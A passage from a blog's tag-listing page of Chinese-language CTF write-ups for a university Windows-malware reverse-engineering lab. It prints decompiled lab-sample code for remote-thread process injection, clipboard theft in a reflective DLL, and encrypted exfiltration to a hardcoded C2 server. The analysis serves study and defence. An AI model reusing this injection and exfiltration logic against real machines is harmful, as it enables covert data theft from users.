</span></span><span style=display:flex><span>    hProcess <span style=color:#f92672>=</span> OpenProcess(<span style=color:#ae81ff>0x43Au</span>, <span style=color:#ae81ff>0</span>, edge_pid);
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> ( hProcess )
</span></span><span style=display:flex><span>    {
</span></span><span style=display:flex><span>      lpBaseAddress <span style=color:#f92672>=</span> (<span style=color:#66d9ef>char</span> <span style=color:#f92672>*</span>)VirtualAllocEx(hProcess, <span style=color:#ae81ff>0</span>i64, pe_file_size, <span style=color:#ae81ff>0x3000u</span>, <span style=color:#ae81ff>0x40u</span>);
</span></span><span style=display:flex><span>      <span style=color:#66d9ef>if</span> ( WriteProcessMemory(hProcess, lpBaseAddress, pe_file, pe_file_size, <span style=color:#ae81ff>0</span>i64) )
</span></span><span style=display:flex><span>      {
</span></span><span style=display:flex><span>        lpStartAddress <span style=color:#f92672>=</span> (LPTHREAD_START_ROUTINE)<span style=color:#f92672>&amp;</span>lpBaseAddress[v9];
</span></span><span style=display:flex><span>        CreateRemoteThread(hProcess, <span style=color:#ae81ff>0</span>i64, <span style=color:#ae81ff>0</span>i64, (LPTHREAD_START_ROUTINE)<span style=color:#f92672>&amp;</span>lpBaseAddress[v9], <span style=color:#ae81ff>0</span>i64, <span style=color:#ae81ff>0</span>, <span style=color:#f92672>&amp;</span>ThreadId);
</span></span><span style=display:flex><span>        sub_140001260(<span style=color:#e6db74>&#34;remote thread id: %lu, loader address: %p&#34;</span>, ThreadId, lpStartAddress);
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> <span style=color:#ae81ff>1</span>i64;
</span></span><span style=display:flex><span>      }
</span></span><span style=display:flex><span>      <span style=color:#66d9ef>else</span>
</span></span><span style=display:flex><span>      {
</span></span><span style=display:flex><span>        LastError <span style=color:#f92672>=</span> GetLastError();
</span></span><span style=display:flex><span>        sub_140001260(<span style=color:#e6db74>&#34;WriteProcessMemory failed, %lu&#34;</span>, LastError);
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> <span style=color:#ae81ff>0</span>i64;
</span></span><span style=display:flex><span>      }
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>else</span>
</span></span><span style=display:flex><span>    {
</span></span><span style=display:flex><span>      v4 <span style=color:#f92672>=</span> GetLastError();
</span></span><span style=display:flex><span>      sub_140001260(<span style=color:#e6db74>&#34;OpenProcess failed, %lu&#34;</span>, v4);
</span></span><span style=display:flex><span>      <span style=color:#66d9ef>return</span> <span style=color:#ae81ff>0</span>i64;
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>  }
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>else</span>
</span></span><span style=display:flex><span>  {
</span></span><span style=display:flex><span>    sub_140001260(<span style=color:#e6db74>&#34;get_reflectivce_loader_offset failed</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>);
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> <span style=color:#ae81ff>0</span>i64;
</span></span><span style=display:flex><span>  }
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><p>:::</p><a href=/security/course/ntu-cs/reverse/winmalware-lab/simple-reverse---0x212023-lab---winmalware---extract-next-stage-payload---3/>...</a></p></article><article class="markdown book-post"><h2><a href=/security/course/ntu-cs/reverse/winmalware-lab/simple-reverse---0x222023-lab---winmalware---collect/>Simple Reverse - 0x22(2023 Lab - WinMalware - Collect)</a></h2><div class=text-small><a href=/tags/eductf/>Eductf</a>,
<a href=/tags/ctf/>CTF</a>,
<a href=/tags/reverse/>Reverse</a></div><p><h1 id=simple-reverse---0x222023-lab---winmalware---collect>Simple Reverse - 0x22(2023 Lab - WinMalware - Collect)
<a class=anchor href=#simple-reverse---0x222023-lab---winmalware---collect>#</a></h1><h2 id=background>Background
<a class=anchor href=#background>#</a></h2><p>如果想要分析DLL，可以從以下三個地方切入</p><ul><li>_DllMainCRTStartup (DLL 載入和移除時的初始化與收尾)<ul><li>DllMain / DllEntryPoint / CRT_INIT (function signature 相同)</li><li>找有三個參數的 function call
<img src=https://hackmd.io/_uploads/Sk0GgCaz6.png alt>
範例就大概像這樣，從<code>_DllMainCRTStartup</code>底下有<code>call _CRT_INIT</code>和<code>call DllEntryPoint</code>(<code>DllMain</code>在比較下面)
<img src=https://hackmd.io/_uploads/HklyZRTf6.png alt></li></ul></li><li>Exported Functions</li><li>TLS Callback</li><li><a href=https://learn.microsoft.com/zh-tw/windows/win32/api/winuser/nf-winuser-openclipboard>OpenClipboard</a></li><li><a href=https://learn.microsoft.com/zh-tw/windows/win32/api/winuser/nf-winuser-getclipboarddata>GetClipboardData</a></li><li><a href=https://learn.microsoft.com/zh-tw/windows/win32/api/winbase/nf-winbase-globallock>globalLock</a></li><li><a href="https://learn.microsoft.com/zh-tw/cpp/c-runtime-library/reference/itoa-itow?view=msvc-170">_itoa</a></li></ul><h2 id=source-code>Source Code
<a class=anchor href=#source-code>#</a></h2><p>IDA解析的source code很常會出現明明沒有return value但還是自動建立的狀況，所以適時的刪除return value(Shift+DEL)是對分析比較好的做法</p><ul><li>DllMain<pre tabindex=0><code class="language-cpp=" data-lang="cpp=">BOOL __stdcall DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)
{
  if ( fdwReason == 1 )
  {
    MessageBoxA(0i64, &#34;Reflective Dll Injection success. Remember to delete the persistence file&#34;, &#34;eductf-lab&#34;, 0);
    my_main();    // 不重要的東西
    collect_and_exfiltrate();
  }
  return 1;
}
</code></pre></li><li>collect_and_exfiltrate<pre tabindex=0><code class="language-cpp=" data-lang="cpp=">void collect_and_exfiltrate(void)
{
  PUCHAR pbInput; // [rsp+28h] [rbp-10h] BYREF

  pbInput = 0i64;
  collect_data(&amp;pbInput);
  exfiltrate(pbInput);
}
</code></pre></li><li>collect_data<pre tabindex=0><code class="language-cpp=" data-lang="cpp=">void __fastcall collect_data(char **pbInput)
{
  char *pbInput_1; // [rsp+28h] [rbp-10h] BYREF

  collect_get_clipboard_data(&amp;pbInput_1);
  *pbInput = pbInput_1;
}
</code></pre></li><li>collect_get_clipboard_data<pre tabindex=0><code class="language-cpp=" data-lang="cpp=">void __fastcall collect_get_clipboard_data(LPVOID *pbInput)
{
  HANDLE ClipboardData; // rax
  void *v3; // rsi
  int LastError; // eax
  char Buffer[34]; // [rsp+26h] [rbp-22h] BYREF

  if ( OpenClipboard(0i64) )
  {
    ClipboardData = GetClipboardData(1u);
    v3 = ClipboardData;
    if ( ClipboardData )
    {
      *pbInput = GlobalLock(ClipboardData);
      GlobalUnlock(v3);
    }
    else
    {
      LastError = GetLastError();
      _itoa(LastError, Buffer, 10);
    }
  }
  CloseClipboard();
}
</code></pre></li></ul><h2 id=recon>Recon
<a class=anchor href=#recon>#</a></h2><p>目前要分析的重點著重在DllMain中，所以其他的切入點可以先不管，並且先聚焦在collect data身上。其實作者一開始就有把debug information都放在這邊，所以分析可以更順暢</p><a href=/security/course/ntu-cs/reverse/winmalware-lab/simple-reverse---0x222023-lab---winmalware---collect/>...</a></p></article><article class="markdown book-post"><h2><a href=/security/course/ntu-cs/reverse/winmalware-lab/simple-reverse---0x232023-lab---winmalware---exfiltrate/>Simple Reverse - 0x23(2023 Lab - WinMalware - Exfiltrate)</a></h2><div class=text-small><a href=/tags/eductf/>Eductf</a>,
<a href=/tags/ctf/>CTF</a>,
<a href=/tags/reverse/>Reverse</a></div><p><h1 id=simple-reverse---0x232023-lab---winmalware---exfiltrate>Simple Reverse - 0x23(2023 Lab - WinMalware - Exfiltrate)
<a class=anchor href=#simple-reverse---0x232023-lab---winmalware---exfiltrate>#</a></h1><h2 id=description>Description
<a class=anchor href=#description>#</a></h2><blockquote><p>請根據 next stage payload 的行為，分析 capture.pcapng 中的封包，找出並解密被滲出/傳送到 C2 server 的資料。</p></blockquote><h2 id=background>Background
<a class=anchor href=#background>#</a></h2><ul><li><a href=https://learn.microsoft.com/zh-tw/windows/win32/api/winsock/nf-winsock-wsastartup>WSAStartup</a></li><li><a href=https://learn.microsoft.com/zh-tw/windows/win32/api/winsock/nf-winsock-htons>htons</a></li><li><a href=https://learn.microsoft.com/zh-tw/windows/win32/api/winsock2/nf-winsock2-socket>socket</a></li><li><a href=https://learn.microsoft.com/zh-tw/windows/win32/winsock/sockaddr-2>sockaddr</a></li><li><a href=https://learn.microsoft.com/zh-tw/windows/win32/api/winsock2/nf-winsock2-wsaconnect>WSAConnect</a></li></ul><h2 id=source-code>Source Code
<a class=anchor href=#source-code>#</a></h2><ul><li>exfiltrate
:::spoiler source<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-cpp data-lang=cpp><span style=display:flex><span><span style=color:#66d9ef>void</span> <span style=color:#66d9ef>__fastcall</span> <span style=color:#a6e22e>exfiltrate</span>(PUCHAR pbInput)
</span></span><span style=display:flex><span>{
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>__int64</span> s[<span style=color:#ae81ff>2</span>]; <span style=color:#75715e>// [rsp+28h] [rbp-10h] BYREF
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>
</span></span><span style=display:flex><span>  connect_to_c2(s);
</span></span><span style=display:flex><span>  send_collected_data_to_c2(s[<span style=color:#ae81ff>0</span>], pbInput);
</span></span><span style=display:flex><span>  shutdown(s[<span style=color:#ae81ff>0</span>], <span style=color:#ae81ff>1</span>);
</span></span><span style=display:flex><span>  closesocket(s[<span style=color:#ae81ff>0</span>]);
</span></span><span style=display:flex><span>}
</span></span></code></pre></div>:::</li><li>connect_to_c2
:::spoiler source<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-cpp data-lang=cpp><span style=display:flex><span><span style=color:#66d9ef>void</span> <span style=color:#66d9ef>__fastcall</span> <span style=color:#a6e22e>connect_to_c2</span>(<span style=color:#66d9ef>unsigned</span> <span style=color:#66d9ef>__int64</span> <span style=color:#f92672>*</span>a1)
</span></span><span style=display:flex><span>{
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>unsigned</span> <span style=color:#66d9ef>__int64</span> v2; <span style=color:#75715e>// rax
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>  <span style=color:#66d9ef>struct</span> <span style=color:#a6e22e>sockaddr</span> name; <span style=color:#75715e>// [rsp+20h] [rbp-1B8h] BYREF
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>  <span style=color:#66d9ef>struct</span> <span style=color:#a6e22e>WSAData</span> WSAData; <span style=color:#75715e>// [rsp+30h] [rbp-1A8h] BYREF
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>if</span> ( <span style=color:#f92672>!</span>WSAStartup(<span style=color:#ae81ff>0x202u</span>, <span style=color:#f92672>&amp;</span>WSAData) )
</span></span><span style=display:flex><span>  {
</span></span><span style=display:flex><span>    <span style=color:#f92672>*&amp;</span>name.sa_data[<span style=color:#ae81ff>2</span>] <span style=color:#f92672>=</span> <span style=color:#ae81ff>168470720</span>;
</span></span><span style=display:flex><span>    <span style=color:#f92672>*</span>name.sa_data <span style=color:#f92672>=</span> htons(<span style=color:#ae81ff>0x2BB3u</span>);
</span></span><span style=display:flex><span>    name.sa_family <span style=color:#f92672>=</span> <span style=color:#ae81ff>2</span>;
</span></span><span style=display:flex><span>    v2 <span style=color:#f92672>=</span> socket(<span style=color:#ae81ff>2</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>6</span>);
</span></span><span style=display:flex><span>    <span style=color:#f92672>*</span>a1 <span style=color:#f92672>=</span> v2;
</span></span><span style=display:flex><span>    connect(v2, <span style=color:#f92672>&amp;</span>name, <span style=color:#ae81ff>16</span>);
</span></span><span style=display:flex><span>  }
</span></span><span style=display:flex><span>}
</span></span></code></pre></div>:::</li><li>send_collected_data_to_c2
:::spoiler source<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-cpp data-lang=cpp><span style=display:flex><span><span style=color:#66d9ef>void</span> <span style=color:#66d9ef>__fastcall</span> <span style=color:#a6e22e>send_collected_data_to_c2</span>(SOCKET s, PUCHAR pbInput)
</span></span><span style=display:flex><span>{
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>char</span> <span style=color:#f92672>*</span>v4; <span style=color:#75715e>// rbx
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>  <span style=color:#66d9ef>int</span> v5; <span style=color:#75715e>// esi
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>  <span style=color:#66d9ef>int</span> i; <span style=color:#75715e>// eax
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>  <span style=color:#66d9ef>char</span> v7; <span style=color:#75715e>// al
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>  <span style=color:#66d9ef>int</span> j; <span style=color:#75715e>// ecx
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>  <span style=color:#66d9ef>int</span> v9; <span style=color:#75715e>// eax
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>
</span></span><span style=display:flex><span>  v4 <span style=color:#f92672>=</span> malloc(<span style=color:#ae81ff>0x4Cu</span>i64);
</span></span><span style=display:flex><span>  <span style=color:#f92672>*</span>v4 <span style=color:#f92672>=</span> <span style=color:#ae81ff>0x11877811</span>;
</span></span><span style=display:flex><span>  <span style=color:#f92672>*</span>(v4 <span style=color:#f92672>+</span> <span style=color:#ae81ff>1</span>) <span style=color:#f92672>=</span> <span style=color:#ae81ff>4</span>;
</span></span><span style=display:flex><span>  <span style=color:#f92672>*</span>(v4 <span style=color:#f92672>+</span> <span style=color:#ae81ff>2</span>) <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>;
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>if</span> ( send(s, v4, <span style=color:#ae81ff>76</span>, <span style=color:#ae81ff>0</span>) <span style=color:#f92672>&gt;</span> <span style=color:#ae81ff>0xB</span> )
</span></span><span style=display:flex><span>  {
</span></span><span style=display:flex><span>    v5 <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>;
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>while</span> ( v5 <span style=color:#f92672>&lt;=</span> <span style=color:#ae81ff>2</span> )
</span></span><span style=display:flex><span>    {
</span></span><span style=display:flex><span>      <span style=color:#66d9ef>if</span> ( recv(s, v4, <span style=color:#ae81ff>76</span>, <span style=color:#ae81ff>0</span>) <span style=color:#f92672>&gt;</span> <span style=color:#ae81ff>0xB</span> <span style=color:#f92672>&amp;&amp;</span> <span style=color:#f92672>*</span>v4 <span style=color:#f92672>==</span> <span style=color:#ae81ff>0x11877811</span> )
</span></span><span style=display:flex><span>      {
</span></span><span style=display:flex><span>        v9 <span style=color:#f92672>=</span> <span style=color:#f92672>*</span>(v4 <span style=color:#f92672>+</span> <span style=color:#ae81ff>2</span>);
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> ( v9 )
</span></span><span style=display:flex><span>        {
</span></span><span style=display:flex><span>          <span style=color:#66d9ef>switch</span> ( v9 )
</span></span><span style=display:flex><span>          {
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>case</span> <span style=color:#ae81ff>1</span><span style=color:#f92672>:</span>
</span></span><span style=display:flex><span>              <span style=color:#f92672>*</span>v4 <span style=color:#f92672>=</span> <span style=color:#ae81ff>0x11877811</span>;
</span></span><span style=display:flex><span>              <span style=color:#f92672>*</span>(v4 <span style=color:#f92672>+</span> <span style=color:#ae81ff>1</span>) <span style=color:#f92672>=</span> <span style=color:#ae81ff>4</span>;
</span></span><span style=display:flex><span>              <span style=color:#f92672>*</span>(v4 <span style=color:#f92672>+</span> <span style=color:#ae81ff>2</span>) <span style=color:#f92672>=</span> <span style=color:#ae81ff>1</span>;
</span></span><span style=display:flex><span>              encrypt_key <span style=color:#f92672>=</span> (v4 <span style=color:#f92672>+</span> <span style=color:#ae81ff>12</span>);
</span></span><span style=display:flex><span>              encrypt_data(pbInput);
</span></span><span style=display:flex><span>              <span style=color:#66d9ef>for</span> ( i <span style=color:#f92672>=</span> <span style=color:#ae81ff>2</span>; i <span style=color:#f92672>&lt;=</span> <span style=color:#ae81ff>23</span>; <span style=color:#f92672>++</span>i )
</span></span><span style=display:flex><span>                v4[i <span style=color:#f92672>+</span> <span style=color:#ae81ff>12</span>] <span style=color:#f92672>+=</span> v4[i <span style=color:#f92672>+</span> <span style=color:#ae81ff>11</span>] <span style=color:#f92672>-</span> v4[i <span style=color:#f92672>+</span> <span style=color:#ae81ff>10</span>];
</span></span><span style=display:flex><span>              <span style=color:#66d9ef>break</span>;
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>case</span> <span style=color:#ae81ff>2</span><span style=color:#f92672>:</span>
</span></span><span style=display:flex><span>              <span style=color:#f92672>*</span>v4 <span style=color:#f92672>=</span> <span style=color:#ae81ff>0x11877811</span>;
</span></span><span style=display:flex><span>              <span style=color:#f92672>*</span>(v4 <span style=color:#f92672>+</span> <span style=color:#ae81ff>1</span>) <span style=color:#f92672>=</span> <span style=color:#ae81ff>28</span>;
</span></span><span style=display:flex><span>              <span style=color:#f92672>*</span>(v4 <span style=color:#f92672>+</span> <span style=color:#ae81ff>2</span>) <span style=color:#f92672>=</span> <span style=color:#ae81ff>2</span>;
</span></span><span style=display:flex><span>              memcpy_s(v4 <span style=color:#f92672>+</span> <span style=color:#ae81ff>12</span>, <span style=color:#ae81ff>0x18u</span>i64, cipher, <span style=color:#ae81ff>0x18u</span>i64);
</span></span><span style=display:flex><span>              <span style=color:#66d9ef>break</span>;
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>case</span> <span style=color:#ae81ff>3</span><span style=color:#f92672>:</span>
</span></span><span style=display:flex><span>              <span style=color:#66d9ef>goto</span> LABEL_20;
</span></span><span style=display:flex><span>          }
</span></span><span style=display:flex><span>        }
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>else</span>
</span></span><span style=display:flex><span>        {
</span></span><span style=display:flex><span>          <span style=color:#f92672>*</span>v4 <span style=color:#f92672>=</span> <span style=color:#ae81ff>0x11877811</span>;
</span></span><span style=display:flex><span>          <span style=color:#f92672>*</span>(v4 <span style=color:#f92672>+</span> <span style=color:#ae81ff>1</span>) <span style=color:#f92672>=</span> <span style=color:#ae81ff>4</span>;
</span></span><span style=display:flex><span>          <span style=color:#f92672>*</span>(v4 <span style=color:#f92672>+</span> <span style=color:#ae81ff>2</span>) <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>;
</span></span><span style=display:flex><span>        }
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>for</span> ( j <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>; j <span style=color:#f92672>&lt;=</span> <span style=color:#ae81ff>39</span>; <span style=color:#f92672>++</span>j )
</span></span><span style=display:flex><span>        {
</span></span><span style=display:flex><span>          v7 <span style=color:#f92672>=</span> v4[j <span style=color:#f92672>+</span> <span style=color:#ae81ff>36</span>] <span style=color:#f92672>+</span> v4[<span style=color:#ae81ff>43</span>] <span style=color:#f92672>+</span> v4[<span style=color:#ae81ff>49</span>] <span style=color:#f92672>-</span> v4[<span style=color:#ae81ff>67</span>];
</span></span><span style=display:flex><span>          v4[j <span style=color:#f92672>+</span> <span style=color:#ae81ff>36</span>] <span style=color:#f92672>=</span> v7;
</span></span><span style=display:flex><span>          v4[j <span style=color:#f92672>+</span> <span style=color:#ae81ff>36</span>] <span style=color:#f92672>=</span> v4[<span style=color:#ae81ff>54</span>] <span style=color:#f92672>-</span> (v4[<span style=color:#ae81ff>61</span>] <span style=color:#f92672>+</span> v4[<span style=color:#ae81ff>69</span>]) <span style=color:#f92672>+</span> v7;
</span></span><span style=display:flex><span>        }
</span></span><span style=display:flex><span>        send(s, v4, <span style=color:#ae81ff>76</span>, <span style=color:#ae81ff>0</span>);
</span></span><span style=display:flex><span>        <span style=color:#f92672>++</span>v5;
</span></span><span style=display:flex><span>      }
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>LABEL_20:
</span></span><span style=display:flex><span>    free(v4);
</span></span><span style=display:flex><span>  }
</span></span><span style=display:flex><span>}
</span></span></code></pre></div>:::</li></ul><h2 id=recon>Recon
<a class=anchor href=#recon>#</a></h2><ol><li><p><code>connet_to_c2</code>
目標是取得c2 server的IP和port number</p><a href=/security/course/ntu-cs/reverse/winmalware-lab/simple-reverse---0x232023-lab---winmalware---exfiltrate/>...</a></p></article><ul class="pagination pagination-default"><li class=page-item><a href=/tags/eductf/ aria-label=First class=page-link role=button><span aria-hidden=true>&#171;&#171;</span></a></li><li class=page-item><a href=/tags/eductf/page/5/ aria-label=Previous class=page-link role=button><span aria-hidden=true>&#171;</span></a></li><li class=page-item><a href=/tags/eductf/page/4/ aria-label="Page 4" class=page-link role=button>4</a></li><li class=page-item><a href=/tags/eductf/page/5/ aria-label="Page 5" class=page-link role=button>5</a></li><li class="page-item active"><a aria-current=page aria-label="Page 6" class=page-link role=button>6</a></li><li class=page-item><a href=/tags/eductf/page/7/ aria-label="Page 7" class=page-link role=button>7</a></li><li class=page-item><a href=/tags/eductf/page/8/ aria-label="Page 8" class=page-link role=button>8</a></li><li class=page-item><a href=/tags/eductf/page/7/ aria-label=Next class=page-link role=button><span aria-hidden=true>&#187;</span></a></li><li class=page-item><a href=/tags/eductf/page/9/ aria-label=Last class=page-link role=button><span aria-hidden=true>&#187;&#187;</span></a></li></ul><footer class=book-footer><div class="flex flex-wrap justify-between"></div><script>(function(){function e(e){const t=window.getSelection(),n=document.createRange();n.selectNodeContents(e),t.removeAllRanges(),t.addRange(n)}document.querySelectorAll("pre code").forEach(t=>{t.addEventListener("click",function(){if(window.getSelection().toString())return;e(t.parentElement),navigator.clipboard&&navigator.clipboard.writeText(t.parentElement.textContent)})})})()</script></footer><label for=menu-control class="hidden book-menu-overlay"></label></div><aside class=book-toc><div class=book-toc-content><nav><ul><li class=book-section-flat><strong>Categories</strong><ul></ul></li><li class=book-section-flat><strong>Tags</strong><ul><li class="flex justify-between"><a href=/tags/ad/>AD</a>
<span>25</span></li><li class="flex justify-between"><a href=/tags/adworld/>Adworld</a>
<span>6</span></li><li class="flex justify-between"><a href=/tags/aegis/>AEGIS</a>
<span>1</span></li><li class="flex justify-between"><a href=/tags/ai/>AI</a>
<span>1</span></li><li class="flex justify-between"><a href=/tags/ais3/>AIS3</a>
<span>4</span></li><li class="flex justify-between"><a href=/tags/android/>Android</a>
<span>11</span></li><li class="flex justify-between"><a href=/tags/balsnctf/>BalsnCTF</a>
<span>1</span></li><li class="flex justify-between"><a href=/tags/book/>Book</a>
<span>3</span></li><li class="flex justify-between"><a href=/tags/btlo/>BTLO</a>
<span>8</span></li><li class="flex justify-between"><a href=/tags/cggc/>CGGC</a>
<span>1</span></li><li class="flex justify-between"><a href=/tags/chatgpt/>ChatGPT</a>
<span>1</span></li><li class="flex justify-between"><a href=/tags/crewctf/>CrewCTF</a>
<span>6</span></li><li class="flex justify-between"><a href=/tags/crypto/>Crypto</a>
<span>36</span></li><li class="flex justify-between"><a href=/tags/cryptography/>Cryptography</a>
<span>7</span></li><li class="flex justify-between"><a href=/tags/csc/>CSC</a>
<span>1</span></li><li class="flex justify-between"><a href=/tags/ctf/>CTF</a>
<span>267</span></li><li class="flex justify-between"><a href=/tags/cyberdefender/>CyberDefender</a>
<span>23</span></li><li class="flex justify-between"><a href=/tags/data-structure/>Data Structure</a>
<span>6</span></li><li class="flex justify-between"><a href=/tags/deadfacectf/>DeadFaceCTF</a>
<span>1</span></li><li class="flex justify-between"><a href=/tags/digital-forensics/>Digital Forensics</a>
<span>2</span></li><li class="flex justify-between"><a href=/tags/drozer/>Drozer</a>
<span>10</span></li><li class="flex justify-between"><a href=/tags/easy/>Easy</a>
<span>2</span></li><li class="flex justify-between"><a href=/tags/eductf/>Eductf</a>
<span>85</span></li><li class="flex justify-between"><a href=/tags/endpoint-forensics/>Endpoint Forensics</a>
<span>16</span></li><li class="flex justify-between"><a href=/tags/english-writing/>English Writing</a>
<span>1</span></li><li class="flex justify-between"><a href=/tags/forensics/>Forensics</a>
<span>8</span></li><li class="flex justify-between"><a href=/tags/general-skill/>General Skill</a>
<span>4</span></li><li class="flex justify-between"><a href=/tags/hackthebox/>Hackthebox</a>
<span>1</span></li><li class="flex justify-between"><a href=/tags/incident-response/>Incident Response</a>
<span>5</span></li><li class="flex justify-between"><a href=/tags/information-security/>Information Security</a>
<span>25</span></li><li class="flex justify-between"><a href=/tags/interview/>Interview</a>
<span>2</span></li><li class="flex justify-between"><a href=/tags/latex/>LaTeX</a>
<span>1</span></li><li class="flex justify-between"><a href=/tags/leetcode/>LeetCode</a>
<span>2</span></li><li class="flex justify-between"><a href=/tags/machine-learning/>Machine Learning</a>
<span>5</span></li><li class="flex justify-between"><a href=/tags/malware-reverse-engineering-and-analysis/>Malware Reverse Engineering and Analysis</a>
<span>7</span></li><li class="flex justify-between"><a href=/tags/meeting-paper/>Meeting Paper</a>
<span>20</span></li><li class="flex justify-between"><a href=/tags/misc/>Misc</a>
<span>44</span></li><li class="flex justify-between"><a href=/tags/mobsf/>MobSF</a>
<span>2</span></li><li class="flex justify-between"><a href=/tags/network-forensics/>Network Forensics</a>
<span>4</span></li><li class="flex justify-between"><a href=/tags/nisra/>NISRA</a>
<span>8</span></li><li class="flex justify-between"><a href=/tags/ntu/>NTU</a>
<span>67</span></li><li class="flex justify-between"><a href=/tags/ntu_ct/>NTU_CT</a>
<span>6</span></li><li class="flex justify-between"><a href=/tags/ntu_ml/>NTU_ML</a>
<span>5</span></li><li class="flex justify-between"><a href=/tags/ntu_mr/>NTU_MR</a>
<span>7</span></li><li class="flex justify-between"><a href=/tags/ntu_os/>NTU_OS</a>
<span>4</span></li><li class="flex justify-between"><a href=/tags/ntu_padns/>NTU_PADNS</a>
<span>8</span></li><li class="flex justify-between"><a href=/tags/ntu_st/>NTU_ST</a>
<span>3</span></li><li class="flex justify-between"><a href=/tags/ntucns/>NTUCNS</a>
<span>11</span></li><li class="flex justify-between"><a href=/tags/ntust/>NTUST</a>
<span>1</span></li><li class="flex justify-between"><a href=/tags/ntustisc/>NTUSTISC</a>
<span>32</span></li><li class="flex justify-between"><a href=/tags/ntustws/>NTUSTWS</a>
<span>29</span></li><li class="flex justify-between"><a href=/tags/nycu/>NYCU</a>
<span>6</span></li><li class="flex justify-between"><a href=/tags/picoctf/>PicoCTF</a>
<span>112</span></li><li class="flex justify-between"><a href=/tags/portswigger-web-security-academy/>Portswigger Web Security Academy</a>
<span>29</span></li><li class="flex justify-between"><a href=/tags/problem-solution/>Problem Solution</a>
<span>28</span></li><li class="flex justify-between"><a href=/tags/pwn/>PWN</a>
<span>57</span></li><li class="flex justify-between"><a href=/tags/reverse/>Reverse</a>
<span>46</span></li><li class="flex justify-between"><a href=/tags/security-operation/>Security Operation</a>
<span>1</span></li><li class="flex justify-between"><a href=/tags/side-project/>Side Project</a>
<span>3</span></li><li class="flex justify-between"><a href=/tags/software-testing/>Software Testing</a>
<span>3</span></li><li class="flex justify-between"><a href=/tags/special-topic/>Special Topic</a>
<span>2</span></li><li class="flex justify-between"><a href=/tags/taiwanholyhigh/>TaiwanHolyHigh</a>
<span>9</span></li><li class="flex justify-between"><a href=/tags/tcivs/>TCIVS</a>
<span>1</span></li><li class="flex justify-between"><a href=/tags/threat-intel/>Threat Intel</a>
<span>3</span></li><li class="flex justify-between"><a href=/tags/tools/>Tools</a>
<span>19</span></li><li class="flex justify-between"><a href=/tags/tscctf/>TSCCTF</a>
<span>1</span></li><li class="flex justify-between"><a href=/tags/web/>Web</a>
<span>93</span></li><li class="flex justify-between"><a href=/tags/welcome/>Welcome</a>
<span>1</span></li><li class="flex justify-between"><a href=/tags/windows/>Windows</a>
<span>7</span></li><li class="flex justify-between"><a href=/tags/%E5%90%8D%E8%A9%9E%E8%A7%A3%E9%87%8B/>名詞解釋</a>
<span>10</span></li><li class="flex justify-between"><a href=/tags/%E8%AE%80%E6%9B%B8%E5%BF%83%E5%BE%97/>讀書心得</a>
<span>2</span></li></ul></li></ul></nav></div></aside></main></body></html>